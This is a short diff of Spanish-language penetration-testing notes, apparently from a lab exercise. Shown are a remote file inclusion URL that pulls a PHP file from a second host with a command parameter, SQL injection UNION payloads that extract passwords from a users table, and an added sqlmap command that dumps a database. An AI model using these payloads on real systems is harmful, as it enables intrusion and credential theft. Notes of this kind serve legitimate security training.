@@ -40,3 +40,7 @@ http://192.168.239.10/menu.php?file=http://192.168.119.239/evil.txt.php&cmd=ipco
 ?id=1 UNION select 1,2,3,4,5
 -- extraer informacion 
 UNION select 1,2,group_concat(password),4,5 FROM users
+--automatizado 
+sqlmap -u "http://192.168.239.52/debug.php?id=1" -p"id" --dbms=sqlite --dump
+###
+
